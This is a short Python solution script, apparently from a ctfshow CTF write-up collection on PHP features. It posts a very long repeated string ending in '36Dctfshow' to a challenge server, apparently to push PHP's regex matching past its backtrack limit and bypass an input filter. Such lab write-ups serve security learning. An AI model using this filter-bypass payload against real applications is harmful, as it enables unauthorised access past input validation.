# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ctfshow-php特性.md
# TITLE: ctfshow-php特性
# CATEGORY: web

import requests
url="http://990f2696-ba59-4354-b875-3be043695f59.challenge.ctf.show:8080/"
data={
    "f":'very'*250000+'36Dctfshow'
}
resp=requests.post(url=url,data=data)
print(resp.text)
